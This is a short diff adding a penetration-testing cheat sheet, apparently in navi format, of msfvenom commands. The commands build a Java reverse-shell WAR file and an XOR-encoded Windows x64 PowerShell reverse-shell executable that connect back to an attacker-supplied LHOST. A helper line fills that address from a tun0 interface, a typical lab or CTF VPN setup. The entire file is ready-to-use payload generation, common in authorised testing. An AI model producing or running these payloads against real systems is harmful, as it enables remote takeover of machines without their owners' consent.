@@ -1,0 +1,9 @@
+% msfvenom
+
+# java reverse shell
+msfvenom -p java/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war
+
+# windows 64 reverse powershell
+msfvenom -p windows/x64/powershell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -a x64 --platform windows -b '\x00' -e x64\xor_dynamic -o shell.exe
+
+$ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
